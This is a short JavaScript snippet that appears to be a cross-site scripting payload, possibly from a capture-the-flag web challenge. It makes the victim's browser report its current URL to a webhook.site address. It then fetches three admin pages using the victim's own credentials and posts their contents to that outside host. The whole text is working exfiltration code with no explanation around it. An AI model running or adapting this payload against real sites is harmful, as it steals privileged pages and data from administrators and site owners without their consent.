const W = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";
const send = (tag, data) => fetch(`${W}/${tag}`, {
  method: "POST",
  mode: "no-cors",
  body: data,
});

send("alive", location.href);

["/admin/", "/admin/review.php", "/admin/search.php"].forEach((url) => {
  fetch(url, { credentials: "include" })
    .then((response) => response.text())
    .then((body) => send(`page-${btoa(url)}`, body));
});
